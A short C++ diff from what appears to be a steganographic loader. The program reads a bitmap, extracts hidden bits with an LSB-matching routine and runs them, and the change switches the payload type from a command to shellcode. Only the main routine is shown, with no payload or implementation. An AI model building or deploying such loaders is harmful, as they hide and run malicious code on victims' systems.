@@ -16,11 +16,11 @@ int _tmain(int argc, TCHAR** argv) {
         Bitmap* bmp = img.loadImage();
 
 
-        auto alg = Algorithms::LSB();
+        auto alg = Algorithms::LSBM();
         uint8_t* payload_data = alg.readImage(bmp, payload_bits);
 
 
-        auto pld = Payloads::Cmd();
+        auto pld = Payloads::Shellcode();
         pld.Run(payload_data, payload_bits);
 
         // Shutdown Gdiplus
